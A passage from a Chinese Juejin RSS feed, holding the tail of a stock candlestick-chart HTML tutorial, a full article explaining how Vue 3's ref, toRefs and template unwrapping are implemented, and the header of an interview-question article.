                btn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.indicator-btn'</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">b</span> =&gt;</span> b.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'active'</span>));
                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'active'</span>);
                    currentIndicator = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">'data-indicator'</span>);
                    <span class="hljs-comment">// 这里可以添加切换技术指标的逻辑</span>
                });
            });
            
            <span class="hljs-comment">// 窗口大小变化时调整图表大小</span>
            <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
                myChart.<span class="hljs-title function_">resize</span>();
            });
        }
        
        <span class="hljs-comment">// 页面加载完成后初始化</span>
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'DOMContentLoaded'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
            <span class="hljs-title function_">initEventListeners</span>();
            <span class="hljs-title function_">updateChart</span>();
        });
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h3 data-id="heading-2">功能说明</h3>
<p>这个HTML页面提供了以下功能：</p>
<ol>
<li><strong>多时间框架切换</strong>：支持1分钟、5分钟、15分钟、30分钟、1小时、日线、周线和月线视图</li>
<li><strong>股票选择</strong>：可以查看雅加达综合指数(JCI)和印尼主要股票（如BBCA、BBRI等）</li>
<li><strong>技术指标</strong>：包含MA（移动平均线）等常用技术指标</li>
<li><strong>实时数据展示</strong>：显示当前价格、涨跌幅、开盘价、最高价和最低价</li>
<li><strong>交互功能</strong>：支持图表缩放、平移等操作</li>
</ol>
<h3 data-id="heading-3">技术实现</h3>
<p>页面使用ECharts库绘制K线图，这是一个功能强大的数据可视化库。通过JavaScript生成模拟的K线数据（实际应用中应替换为真实的API调用）。 页面设计采用暗色主题，符合金融数据展示的常见风格，确保数据可视性并减少视觉疲劳。</p>
<h3 data-id="heading-4">如何使用</h3>
<ol>
<li>将上述代码保存为HTML文件</li>
<li>在浏览器中打开该文件</li>
<li>使用左侧面板切换不同的时间框架和股票</li>
<li>通过图表下方的滑块缩放和平移K线图</li>
</ol>
<p>在实际应用中，您需要将模拟数据生成部分替换为真实的API调用，例如使用<a href="https://link.juejin.cn?target=https%3A%2F%2Fpao.stocktv.top%2F" target="_blank" title="https://pao.stocktv.top/" ref="nofollow noopener noreferrer">StockTV</a>等金融数据服务商提供的接口。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue响应式原理(13)-ref实现原理解析]]></title>    <link>https://juejin.cn/post/7577171133444227108</link>    <guid>https://juejin.cn/post/7577171133444227108</guid>    <pubDate>2025-11-27T06:17:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577171133444227108" data-draft-id="7576935292428861482" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue响应式原理(13)-ref实现原理解析"/> <meta itemprop="keywords" content="前端,Vue.js"/> <meta itemprop="datePublished" content="2025-11-27T06:17:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="明教教主张5G"/> <meta itemprop="url" content="https://juejin.cn/user/644766058425008"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue响应式原理(13)-ref实现原理解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/644766058425008/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    明教教主张5G
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:17:44.000Z" title="Thu Nov 27 2025 06:17:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vue 3 中 Ref 实现原理解析</h2>
<p>在 Vue 3 中，<code>ref</code> 是组合式 API（Composition API）的核心。很多开发者虽然会用，但对其内部运作机制、<code>ref</code> 与 <code>reactive</code> 的关系、以及为什么在scrit中我们访问 <code>ref</code> 数据需要用 <code>.value</code>, 但是在模板里不需要 <code>.value</code> 往往一知半解。</p>
<p>本文将剥离复杂的边界情况，用最精简的代码还原 Vue 3 源码的核心逻辑，带你彻底搞懂这三个问题：</p>
<ol>
<li><strong><code>ref</code> 是如何实现的？</strong></li>
<li><strong><code>toRefs</code> 是如何解决解构丢失响应性问题的？</strong></li>
<li><strong>为什么在模板中不需要 <code>.value</code>？</strong></li>
</ol>
<hr/>
<h3 data-id="heading-1">1. Ref 的原理解析</h3>
<h4 data-id="heading-2">为什么需要 Ref？</h4>
<p>在先前的部分中，我们对响应式数据的原理进行了介绍，我们通过 <code>reactive</code> 函数处理一个对象来使其转变为响应式数据，而对于 JavaScript 中的原始类型（String, Number, Boolean, ...）是<strong>值传递</strong>的。如果你把一个数字传给一个函数，函数无法追踪这个数字的变化。为了让原始值变成“响应式”，我们需要把它包裹在一个对象中（Wrapper Pattern），利用对象的 <code>getter</code> 和 <code>setter</code> 来拦截访问和修改。</p>
<h4 data-id="heading-3">核心实现：<code>RefImpl</code> 类</h4>
<p>Vue 3 内部通过 <code>RefImpl</code> 类来实现 <code>ref</code>。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 伪代码：简化版的 RefImpl</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">RefImpl</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">_value</span>: <span class="hljs-built_in">any</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">_rawValue</span>: <span class="hljs-built_in">any</span>;
  <span class="hljs-keyword">public</span> <span class="hljs-attr">dep</span>: <span class="hljs-title class_">Dep</span>; <span class="hljs-comment">// 依赖容器</span>
  <span class="hljs-keyword">public</span> __v_isRef = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 标记这是一个 ref 对象</span>

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">value</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_rawValue</span> = value;
    <span class="hljs-comment">// 如果传入的是对象，则通过 reactive 转换，否则保持原值</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = <span class="hljs-title function_">isObject</span>(value) ? <span class="hljs-title function_">reactive</span>(value) : value;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dep</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(); <span class="hljs-comment">// 假设这是依赖收集容器</span>
  }

  <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>() {
    <span class="hljs-comment">// 1. 依赖收集 (Track)</span>
    <span class="hljs-title function_">trackEffects</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">dep</span>); 
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span>;
  }

  <span class="hljs-keyword">set</span> <span class="hljs-title function_">value</span>(<span class="hljs-params">newVal</span>) {
    <span class="hljs-comment">// 只有值发生改变时才触发</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">hasChanged</span>(newVal, <span class="hljs-variable language_">this</span>.<span class="hljs-property">_rawValue</span>)) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_rawValue</span> = newVal;
      <span class="hljs-comment">// 如果新值是对象，同样需要转换</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = <span class="hljs-title function_">isObject</span>(newVal) ? <span class="hljs-title function_">reactive</span>(newVal) : newVal;
      <span class="hljs-comment">// 2. 派发更新 (Trigger)</span>
      <span class="hljs-title function_">triggerEffects</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">dep</span>); 
    }
  }
}

<span class="hljs-comment">// 暴露出来的 ref 函数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">ref</span>(<span class="hljs-params">value</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RefImpl</span>(value);
}
</code></pre>
<h4 data-id="heading-4">关键点解析</h4>
<ol>
<li><code>ref</code> 本质上会返回一个类的实例对象，这个对象拥有 <code>.value</code> 的访问器属性。</li>
<li><strong>__v_isRef</strong>：RefImpl 类需要增加一个 <code>__v_isRef</code> 属性用于区别 “Ref对象”与“含有 value 属性的普通对象”。<code>ref</code> 的本质是一个拥有 <code>.value</code> 属性的对象，但并不是所有拥有 <code>.value</code> 的对象都是 <code>ref</code>。如果不增加这个标识位，很难区分下面二者的区别：</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 真正的 ref</span>
<span class="hljs-keyword">const</span> realRef = <span class="hljs-title function_">ref</span>(<span class="hljs-number">1</span>); 
<span class="hljs-comment">// realRef 结构: { value: 1, dep: Set, __v_isRef: true, ... }</span>

<span class="hljs-comment">// 用户不小心定义的普通对象</span>
<span class="hljs-keyword">const</span> fakeRef = { <span class="hljs-attr">value</span>: <span class="hljs-number">1</span> };
<span class="hljs-comment">// fakeRef 结构: { value: 1 }</span>
</code></pre>
<p>当 <code>Vue</code> 的模板系统或者 <code>reactive</code> 尝试“自动解包”（读取 <code>.value</code>）时，如果没有 <code>__v_isRef</code>，系统可能会错误地把用户定义的 <code>fakeRef</code> 也当作响应式对象处理，去尝试读取它的依赖（<code>dep</code>），这会导致报错或逻辑混乱。</p>
<ol start="3">
<li><strong>Getter/Setter</strong>：
<ul>
<li><code>get value()</code>：当访问 <code>.value</code> 时，调用 <code>track</code> 收集当前副作用函数（Effect）。</li>
<li><code>set value()</code>：当修改 <code>.value</code> 时，比较新旧值，若变化则调用 <code>trigger</code> 通知视图更新。</li>
</ul>
</li>
<li><strong>兼容对象参数</strong>：如果 <code>ref(obj)</code> 接收的是一个对象，源码中会调用 <code>reactive(obj)</code> 将其转化为深层响应式对象。这就是为什么 <code>ref</code> 可以包裹对象，且对象内部属性变化也能触发更新。</li>
</ol>
<hr/>
<h3 data-id="heading-5">2. toRefs 的原理解析</h3>
<h4 data-id="heading-6">为什么需要 toRefs？</h4>
<p>当我们对一个 <code>reactive</code> 对象进行<strong>解构</strong>时，会丢失响应性，因为解构出来的只是普通的变量。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> state = <span class="hljs-title function_">reactive</span>({ <span class="hljs-attr">count</span>: <span class="hljs-number">1</span> });
<span class="hljs-keyword">const</span> { count } = state; <span class="hljs-comment">// count 此时只是一个普通数字 1，与 state 断开联系了</span>
</code></pre>
<p><code>toRefs</code> 的作用就是把 <code>reactive</code> 对象的每一个属性都转换成一个 <code>ref</code>，但这个 <code>ref</code> 比较特殊，它<strong>链接</strong>到了源对象。</p>
<h4 data-id="heading-7">核心实现：<code>ObjectRefImpl</code> 类</h4>
<p><code>toRefs</code> 内部并不是创建标准的 <code>RefImpl</code>，而是创建了 <code>ObjectRefImpl</code>。它不存储值，只是作为源对象属性的“代理”。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectRefImpl</span> {
  <span class="hljs-keyword">public</span> __v_isRef = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 标记为 ref</span>

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> _object, <span class="hljs-comment">// 源 reactive 对象</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> _key     <span class="hljs-comment">// 指定的 key</span>
  </span>) {}

  <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>() {
    <span class="hljs-comment">// 访问时，直接读取源对象的属性</span>
    <span class="hljs-comment">// 因为 _object 是响应式的，所以这里会自动触发源对象的依赖收集</span>
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_object</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_key</span>];
  }

  <span class="hljs-keyword">set</span> <span class="hljs-title function_">value</span>(<span class="hljs-params">newVal</span>) {
    <span class="hljs-comment">// 修改时，直接修改源对象的属性</span>
    <span class="hljs-comment">// 这里会自动触发源对象的更新派发</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_object</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_key</span>] = newVal;
  }
}

<span class="hljs-comment">// toRef 函数：针对单个属性</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">toRef</span>(<span class="hljs-params"><span class="hljs-built_in">object</span>, key</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectRefImpl</span>(<span class="hljs-built_in">object</span>, key);
}

<span class="hljs-comment">// toRefs 函数：遍历对象所有属性</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">toRefs</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>) {
  <span class="hljs-keyword">const</span> ret = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(<span class="hljs-built_in">object</span>) ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-built_in">object</span>.<span class="hljs-property">length</span>) : {};
  
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> <span class="hljs-built_in">object</span>) {
    <span class="hljs-comment">// 为每个属性创建一个 ObjectRefImpl</span>
    ret[key] = <span class="hljs-title function_">toRef</span>(<span class="hljs-built_in">object</span>, key);
  }
  
  <span class="hljs-keyword">return</span> ret;
}
</code></pre>
<h4 data-id="heading-8">关键点解析</h4>
<ol>
<li><code>ObjectRefImpl</code> 自身没有任何 <code>track</code> 或 <code>trigger</code> 的逻辑。它只是把操作转发给了源 <code>reactive</code> 对象。当我们获取到 <code>toRef</code> 函数返回的对象时，我们对其 .value 属性的读写实际上会转发到对 <code>this._object[this._key]</code> 的读写，自然就会触发其 <code>track</code> 或 <code>trigger</code> 的逻辑。</li>
<li><code>toRefs</code> 返回的是一个普通对象，里面的值全是 <code>ref</code>。这个普通对象可以被解构，解构出来的变量依然是 <code>ObjectRefImpl</code> 实例，依然保持着对源对象的引用。</li>
</ol>
<hr/>
<h3 data-id="heading-9">3. 模板自动解包 (Unwrapping) 原理解析</h3>
<h4 data-id="heading-10">现象</h4>
<p>在 <code>setup</code> 中我们需要用 <code>count.value</code>，但在 <code>&lt;template&gt;</code> 中我们直接写 <code>{{ count }}</code> 即可。这是 Vue 在编译和渲染阶段做了特殊处理。</p>
<h4 data-id="heading-11">核心实现：<code>proxyRefs</code></h4>
<p>首先需要介绍两个辅助函数：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 如果是 ref 返回 .value，否则返回原值</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">unref</span>(<span class="hljs-params">ref</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">isRef</span>(ref) ? ref.<span class="hljs-property">value</span> : ref;
}
<span class="hljs-comment">// 根据对象 __v_isRef 属性判断其是否是 ref 对象</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">isRef</span>(<span class="hljs-params">r: any</span>): r is <span class="hljs-title class_">Ref</span> {
  <span class="hljs-keyword">return</span> !!(r &amp;&amp; r.<span class="hljs-property">__v_isRef</span> === <span class="hljs-literal">true</span>);
}
</code></pre>
<p><code>unref</code> 函数首先判断传入的是否是 <code>ref</code> 对象，如果是则返回 <code>ref.value</code>， 否则返回 <code>ref</code> 本身，这个函数正是模板自动解包原理的核心。</p>
<p>Vue 在完成对模板的解析之后，将 <code>setup</code> 的返回值传递给渲染函数之前，会通过 <code>proxyRefs</code> 函数对其进行一层代理，在代理中拦截了 get 和 set 操作，并通过 <code>unref</code> 函数</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> shallowUnwrapHandlers = {
  <span class="hljs-attr">get</span>: <span class="hljs-function">(<span class="hljs-params">target, key, receiver</span>) =&gt;</span> {
    <span class="hljs-comment">// 1. 获取真实的值</span>
    <span class="hljs-keyword">const</span> value = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, key, receiver);
    <span class="hljs-comment">// 2. 自动解包：如果是 ref 就返回 value.value，否则直接返回</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">unref</span>(value);
  },
  
  <span class="hljs-attr">set</span>: <span class="hljs-function">(<span class="hljs-params">target, key, value, receiver</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> oldValue = target[key];
    <span class="hljs-comment">// 3. 特殊处理：如果旧值是 ref，但新值不是 ref</span>
    <span class="hljs-comment">// 意味着用户想给 ref 赋值：count.value = 1</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isRef</span>(oldValue) &amp;&amp; !<span class="hljs-title function_">isRef</span>(value)) {
      oldValue.<span class="hljs-property">value</span> = value;
      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    } 
    <span class="hljs-comment">// 其他情况直接替换</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(target, key, value, receiver);
  }
};

<span class="hljs-comment">// Vue 内部会在 setupState 上套这一层 Proxy</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">proxyRefs</span>(<span class="hljs-params">objectWithRefs</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(objectWithRefs, shallowUnwrapHandlers);
}
</code></pre>
<h4 data-id="heading-12">运行流程</h4>
<ol>
<li><strong>建立代理</strong>：当 <code>setup()</code> 函数返回一个对象（包含 ref）时，Vue 内部调用 <code>handleSetupResult</code>，使用 <code>proxyRefs</code> 包装这个返回对象，生成 render context（渲染上下文）。</li>
<li><strong>模板读取</strong>：
<ul>
<li>当模板渲染遇到 <code>{{ count }}</code> 时，实际上是去在这个 Proxy 对象上取 <code>count</code>。</li>
<li>触发 <code>get</code> 拦截：发现 <code>count</code> 是一个 <code>ref</code>，Proxy 自动帮你调用 <code>.value</code> 并返回结果。</li>
</ul>
</li>
<li><strong>模板赋值</strong>（例如 <code>v-model</code>）：
<ul>
<li>如果在模板中写 <code>&lt;input v-model="count"&gt;</code>。</li>
<li>触发 <code>set</code> 拦截：Proxy 发现 <code>count</code> 原本是 <code>ref</code>，而输入的是普通值，它会将新值赋值给 <code>count.value</code>。</li>
</ul>
</li>
</ol>
<h3 data-id="heading-13">总结</h3>

























<table><thead><tr><th align="left">特性</th><th align="left">核心实现类/函数</th><th align="left">关键原理</th></tr></thead><tbody><tr><td align="left"><strong>ref</strong></td><td align="left"><code>RefImpl</code></td><td align="left">利用 getter/setter 劫持 <code>.value</code> 属性，通过 <code>track/trigger</code> 管理依赖。若值为对象则借助 <code>reactive</code>。</td></tr><tr><td align="left"><strong>toRefs</strong></td><td align="left"><code>ObjectRefImpl</code></td><td align="left">不存值，仅仅是对源 <code>reactive</code> 对象属性的<strong>代理访问</strong>。解决了解构导致的响应性丢失问题。</td></tr><tr><td align="left"><strong>模板解包</strong></td><td align="left"><code>proxyRefs</code></td><td align="left">利用 <code>Proxy</code> 拦截 <code>setup</code> 返回对象的访问，遇到 <code>ref</code> 自动返回 <code>.value</code>，实现由模板到数据的无感读写。</td></tr></tbody></table>
<p>通过阅读这部分源码，我们可以看到 Vue 3 在易用性（自动解包）和灵活性（ref/reactive 分离）之间做了非常精妙的设计。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🔁 字符串反转 × 两数之和：前端面试高频题深度拆解（附5种反转写法 + 哈希优化）]]></title>    <link>https://juejin.cn/post/7576968345875300379</link>    <guid>https://juejin.cn/post/7576968345875300379</guid>    <pubDate>2025-11-27T06:21:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576968345875300379" data-draft-id="7576105442214117426" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🔁 字符串反转 × 两数之和：前端面试高频题深度拆解（附5种反转写法 + 哈希优化）"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2025-11-27T06:21:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="玉宇夕落"/> <meta itemprop="url" content="https://juejin.cn/user/3323164053734988"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🔁 字符串反转 × 两数之和：前端面试高频题深度拆解（附5种反转写法 + 哈希优化）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3323164053734988/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    玉宇夕落
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:21:22.000Z" title="Thu Nov 27 2025 06:21:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
